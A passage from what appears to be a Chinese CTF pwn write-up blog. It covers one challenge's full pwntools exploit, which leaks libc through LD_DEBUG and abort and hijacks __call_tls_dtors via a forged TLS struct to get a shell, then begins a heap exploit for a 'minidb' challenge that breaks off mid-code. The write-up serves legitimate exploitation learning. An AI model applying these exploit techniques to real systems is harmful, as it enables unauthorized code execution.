 read_input(&amp;vars0, 25LL);                     &#x2F;&#x2F; off-by-one  return strtol(&amp;vars0, 0LL, 10);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 __fastcall super_note()&#123;  __int16 v1; &#x2F;&#x2F; sp  unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-10h]  v2 &#x3D; __readfsqword(0x28u);  puts(&quot;Please don&#39;t patch this normal function, we will check it!&quot;);  if ( !super_flag )  &#123;    super_flag &#x3D; 1;    __printf_chk(1LL, &quot;Super note: %d\n&quot;, (v1 + 4));&#x2F;&#x2F;leak addr  &#125;  return v2 - __readfsqword(0x28u);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时存在一个可以实现任意地址读写的函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __noreturn sub_1B70()&#123;  char *s[9]; &#x2F;&#x2F; [rsp+0h] [rbp+0h] BYREF  s[1] &#x3D; __readfsqword(0x28u);  puts(&quot;Please don&#39;t patch this normal function, we will check it!&quot;);  puts(&quot;[+] Debug the note.&quot;);  s[0] &#x3D; 0LL;  __printf_chk(1LL, &quot;[Addr] &quot;);  read(0, s, 8uLL);  __printf_chk(1LL, &quot;[Read] &quot;);  puts(s[0]);  __printf_chk(1LL, &quot;[Addr] &quot;);  read(0, s, 8uLL);  __printf_chk(1LL, &quot;[Write] &quot;);  read(0, s[0], 0x90uLL);  exit(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而在运行程序的时候只能加上<code>dbg</code>或<code>run</code>，泄露地址需要<code>run</code>函数，任意地址读写需要<code>dbg</code>函数，但存在<code>signal</code>机制</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned int my_init()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  signal(6, handler);  signal(14, over);  return alarm(0x3Cu);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>signal</code>函数的作用是设置信号处理函数。第一个参数是要处理的信号编号，第二个参数是指向信号处理函数的指针。信号处理函数是一个特殊的函数，用于在接收到指定信号时执行相应的操作。查了一下信号<code>6</code>是<code>SIGABRT</code>信号，即<code>abort</code>报错，那么只需要触发程序报错即可运行<code>dbg</code></p><p>接下来的操作就是向<code>envp</code>环境变量加入<code>LD_DEBUG=all</code>，触发报错会泄露<code>libc</code>同时还会运行<code>dbg</code>函数，获取<code>system</code>函数地址之后打<code>__call_tls_dtors</code>利用函数中的<code>call rax</code>执行<code>system</code>，但需要根据函数执行过程修改<code>tls</code>结构体</p><p>先写入<code>LD_DEBUG=all</code>，然后利用<code>super note</code>功能泄露栈的低位地址</p><pre class="line-numbers language-none"><code class="language-none">.data:0000000000004020                               ; char aNoteAdd[].data:0000000000004020 4E 6F 74 65 5F 41 64 64 00    aNoteAdd db &#39;Note_Add&#39;,0                ; DATA XREF: main+D1↑o.data:0000000000004029 00 00 00 00 00 00 00          align 10h.data:0000000000004030 4E 6F 74 65 5F 44 65 6C 65 74+aNoteDelete db &#39;Note_Delete&#39;,0.data:000000000000403C 00 00 00 00                   align 20h.data:0000000000004040 4E 6F 74 65 5F 57 72 69 74 65+aNoteWrite db &#39;Note_Write&#39;,0.data:000000000000404B 00 00 00 00 00                align 10h.data:0000000000004050 4E 6F 74 65 5F 52 65 61 64 00 aNoteRead db &#39;Note_Read&#39;,0.data:000000000000405A 00 00 00 00 00 00             align 20h.data:0000000000004060 4E 6F 74 65 5F 45 78 69 74 00 aNoteExit db &#39;Note_Exit&#39;,0.data:000000000000406A 00 00 00 00 00 00             align 10h.data:0000000000004070 2B 2B 2D 2D 2B 2B 2D 2D 00    db &#39;++--++--&#39;,0.data:0000000000004079 00 00 00 00 00 00 00          align 20h.data:0000000000004080 10 18 00 00 00 00 00 00       call_func dq offset add                 ; DATA XREF: main+D8↑o.data:0000000000004088 10 19 00 00 00 00 00 00       dq offset delete.data:0000000000004090 C0 19 00 00 00 00 00 00       dq offset write.data:0000000000004098 80 1A 00 00 00 00 00 00       dq offset dbg_read.data:00000000000040A0 80 14 00 00 00 00 00 00       dq offset my_exit.data:00000000000040A8 B0 14 00 00 00 00 00 00       dq offset super_note.data:00000000000040A8                               _data ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'UserName:'</span><span class="token punctuation">,</span> <span class="token string">b'LD_DEBUG=all'</span><span class="token punctuation">)</span>      <span class="token comment">#envp content</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note $ '</span><span class="token punctuation">,</span> <span class="token string">b'++--++--'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Super note: '</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment">#leak low addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>envp</code>的范围在从<code>envp</code>开始地址到<code>null</code>结束，而之前写入的地址与<code>envp</code>之间存在<code>null</code>，所以需要改指向<code>LD_DEBUG=all</code>的地址为<code>envp</code>能够识别到的地址，在输入功能的函数中存在两字节的溢出，刚好溢出到指向<code>LD_DEBUG=all</code>的低二位，发送地址时需要用<code>p16</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">p &#x3D; b&#39;a&#39; * 0x30 + p16(leak + 0x1c)     #change low addr into envpr.sendlineafter(b&#39;Note $ &#39;, p)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来利用<code>off-by-one</code>通过溢出触发报错来泄露<code>libc</code>地址并进入到<code>dbg</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note $ '</span><span class="token punctuation">,</span> <span class="token string">b'Note_Read'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x19</span><span class="token punctuation">)</span>    <span class="token comment">#abort and leak libc</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'base: 0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后就是利用任意地址写来劫持<code>__call_tls_dtors</code>了，这里要对<code>exit</code>函数进行调试，<code>exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</code></p><pre class="line-numbers language-none"><code class="language-none">  0x7ffff7c45d60 &lt;__call_tls_dtors&gt;       endbr64   0x7ffff7c45d64 &lt;__call_tls_dtors+4&gt;     push   rbp  0x7ffff7c45d65 &lt;__call_tls_dtors+5&gt;     push   rbx  0x7ffff7c45d66 &lt;__call_tls_dtors+6&gt;     sub    rsp, 8  0x7ffff7c45d6a &lt;__call_tls_dtors+10&gt;    mov    rbx, qword ptr [rip + 0x1d301f]► 0x7ffff7c45d71 &lt;__call_tls_dtors+17&gt;    mov    rbp, qword ptr fs:[rbx]  0x7ffff7c45d75 &lt;__call_tls_dtors+21&gt;    test   rbp, rbp  0x7ffff7c45d78 &lt;__call_tls_dtors+24&gt;    je     __call_tls_dtors+93                &lt;__call_tls_dtors+93&gt;   ↓  0x7ffff7c45dbd &lt;__call_tls_dtors+93&gt;    add    rsp, 8  0x7ffff7c45dc1 &lt;__call_tls_dtors+97&gt;    pop    rbx  0x7ffff7c45dc2 &lt;__call_tls_dtors+98&gt;    pop    rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要绕过这个<code>je</code>继续执行下面的内容， 所以<code>rbp</code>指向的值要是<code>0</code>，<code>fs:[rbx]</code>表示<code>tls + rbx</code>地址中的内容为<code>0</code></p><pre class="line-numbers language-none"><code class="language-none">*RBX  0xffffffffffffffa8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; tlstls : 0x7ffff7fb8740pwndbg&gt; p&#x2F;x 0x7ffff7fb8740 + 0xffffffffffffffa8$2 &#x3D; 0x7ffff7fb86e8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>绕过之后就要去改<code>rax = system rdi = /bin/sh</code></p><pre class="line-numbers language-none"><code class="language-none">  0x7ffff7c45d84 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr [rbp]  0x7ffff7c45d88 &lt;__call_tls_dtors+40&gt;    ror    rax, 0x11► 0x7ffff7c45d8c &lt;__call_tls_dtors+44&gt;    xor    rax, qword ptr fs:[0x30]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>rbp</code>指向的值已经被改成<code>0</code>了，执行<code>xor    rax, qword ptr fs:[0x30]</code>即执行将<code>fs:[0x30]</code>与<code>0</code>进行异或存到<code>rax</code>中，所以直接改<code>fs:[0x30]</code>指向<code>system</code>即可</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; tlstls : 0x7ffff7fb8740pwndbg&gt; p&#x2F;x 0x7ffff7fb8740 + 0x30$6 &#x3D; 0x7ffff7fb8770<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来计算指向<code>rdi</code>的地址，将对应地址内容改成<code>/bin/sh</code></p><pre class="line-numbers language-none"><code class="language-none">0x7ffff7c45d99 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr [rbp + 8]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; p&#x2F;x 0x7ffff7fb8740 + 0x30$6 &#x3D; 0x7ffff7fb8770pwndbg&gt; p&#x2F;x 0x7ffff7fb86f0 + 8$7 &#x3D; 0x7ffff7fb86f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后在指向<code>call system</code>之后还要注意一个地址，<code>system-&gt;posix_spawn-&gt;__spawni-&gt;__spawnix-&gt;pthread_setcancelstate</code></p><pre class="line-numbers language-none"><code class="language-none">   0x7ffff7c9b76e &lt;pthread_setcancelstate+14&gt;    mov    rdx, qword ptr fs:[0x10]   0x7ffff7c9b777 &lt;pthread_setcancelstate+23&gt;    test   rsi, rsi   0x7ffff7c9b77a &lt;pthread_setcancelstate+26&gt;    je     pthread_setcancelstate+37               &lt;pthread_setcancelstate+37&gt;► 0x7ffff7c9b77c &lt;pthread_setcancelstate+28&gt;    movzx  eax, byte ptr [rdx + 0x971]   0x7ffff7c9b783 &lt;pthread_setcancelstate+35&gt;    mov    dword ptr [rsi], eax   0x7ffff7c9b785 &lt;pthread_setcancelstate+37&gt;    mov    byte ptr [rdx + 0x971], dil   0x7ffff7c9b78c &lt;pthread_setcancelstate+44&gt;    xor    eax, eax   0x7ffff7c9b78e &lt;pthread_setcancelstate+46&gt;    ret    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>rdx + 0x971</code>需要是一个有效地址且其中储存的内容也要是一个有效地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; tlstls : 0x7ffff7fb8740pwndbg&gt; p&#x2F;x 0x7ffff7fb8740 + 0x10$9 &#x3D; 0x7ffff7fb8750<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>伪造的<code>tls</code>结构体满足以上四个条件即可成功<code>getshell</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_name<span class="token punctuation">,</span> <span class="token string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'UserName:'</span><span class="token punctuation">,</span> <span class="token string">b'LD_DEBUG=all'</span><span class="token punctuation">)</span>      <span class="token comment">#envp content</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note $ '</span><span class="token punctuation">,</span> <span class="token string">b'++--++--'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Super note: '</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment">#leak low addr</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>leak <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span>     <span class="token comment">#change low addr into envp</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note $ '</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note $ '</span><span class="token punctuation">,</span> <span class="token string">b'Note_Read'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x19</span><span class="token punctuation">)</span>    <span class="token comment">#abort and leak libc</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'base: 0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>target <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3b86e8</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'[Addr] '</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#any valid addr</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'[Addr] '</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span>  <span class="token comment">#jne and point to 0 and set rdi</span>p1 <span class="token operator">=</span> p1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3b8750</span> <span class="token operator">-</span> <span class="token number">0x971</span><span class="token punctuation">)</span>  <span class="token comment">#any valid addr stored valid addr </span>p1 <span class="token operator">=</span> p1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>   <span class="token comment">#rax = system xor 0(ebp)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'[Write] '</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="minidb"><a href="#minidb" class="headerlink" title="minidb"></a>minidb</h2><p>就是说在现场没写不出来比赛完还是写不出来（），看了<code>wp</code>和解析终于看懂了呜呜</p><p>数据库堆题，保护全开，漏洞点如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( a1 )  &#123;    printf(&quot;Input the key: &quot;);    __isoc99_scanf(&quot;%ld&quot;, &amp;v3);    ptr &#x3D; sub_168D(a1, v3, 0LL);    if ( ptr )    &#123;      printf(&quot;Input the new value: &quot;);      __isoc99_scanf(&quot;%255s&quot;, value);      len &#x3D; strlen(value);      *(&amp;ptr-&gt;value + len) &#x3D; 0;                 &#x2F;&#x2F; strlen &lt;&#x3D;255 &amp;&amp; oob write \x00       if ( (a1-&gt;type &#x3D;&#x3D; 1 || a1-&gt;type &#x3D;&#x3D; 2) &amp;&amp; len &gt; 0x7F || (a1-&gt;type &#x3D;&#x3D; 3 || a1-&gt;type &#x3D;&#x3D; 4) &amp;&amp; len &gt; 0xFF )      &#123;        puts(&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;);      &#125;      else      &#123;        memcpy(&amp;ptr-&gt;value, value, len);        *(&amp;ptr-&gt;value + len) &#x3D; 0;                      puts(&quot;[+] Succesfully update the value of specific key!&quot;);      &#125;    &#125;    else    &#123;      puts(&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;);    &#125;  &#125;  else  &#123;    puts(&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然限制了在不同类型下的大小，但是在判断大小之前就会将最后一位赋为<code>0</code>，这里可以实现从该堆线下任意一个字节改为<code>0</code>，接下来开始构造堆</p><p>创建一个数据库与三个键值对，目的是在后续将下一个堆<code>name</code>地址末尾改成<code>0</code>时刚好在一个堆上</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x558fca8d1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x558fca8d1290Size: 0x821Allocated chunk | PREV_INUSEAddr: 0x558fca8d1ab0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x558fca8d1ad0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x558fca8d1b70Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x558fca8d1c10Size: 0xa1Top chunk | PREV_INUSEAddr: 0x558fca8d1cb0Size: 0x20351<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再创建一个数据库之后用第一个数据库创建两个键值对并删除第二个键值对和第二个数据库，这样再次申请数据库时就可以让它的<code>name</code>落在这个堆</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token punctuation">)</span>delete_db<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55b60aa00000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x55b60aa00290Size: 0x821Allocated chunk | PREV_INUSEAddr: 0x55b60aa00ab0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x55b60aa00ad0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55b60aa00b70Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55b60aa00c10Size: 0xa1Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55b60aa00cb0Size: 0x821fd: 0x7fd935e27be0bk: 0x7fd935e27be0Free chunk (tcache)Addr: 0x55b60aa014d0Size: 0x20fd: 0x00Allocated chunk | PREV_INUSEAddr: 0x55b60aa014f0Size: 0xa1Free chunk (tcache) | PREV_INUSEAddr: 0x55b60aa01590Size: 0xa1fd: 0x00Top chunk | PREV_INUSEAddr: 0x55b60aa01630Size: 0x1f9d1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次申请一个数据库且大小在<code>0x90</code>，此时会用到刚刚删除的数据库的管理和第一个数据库被释放掉的堆，刚好将第三个数据库的<code>name</code>地址低位改成<code>\x00</code>后落在第一个数据库的第四个堆上</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x98</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55ecd0d2f000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2f290Size: 0x821Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fab0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fad0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fb70Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fc10Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d2fcb0Size: 0x821Free chunk (tcache) | PREV_INUSEAddr: 0x55ecd0d304d0Size: 0x21fd: 0x00Allocated chunk | PREV_INUSEAddr: 0x55ecd0d304f0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55ecd0d30590Size: 0xa1Top chunk | PREV_INUSEAddr: 0x55ecd0d30630Size: 0x1f9d1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x55ecd0d2fcb00x55ecd0d2fcb0: 0x0000000000000000      0x00000000000008210x55ecd0d2fcc0: 0x0000000000000002      0x000055ecd0d30500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时释放掉第一个数据库的第四个堆并不会清除第三个数据库中的<code>name</code>地址，造成<code>UAF</code>，先填充<code>tcache</code>再释放掉这个堆，通过数据库名称列表泄露<code>libc</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span 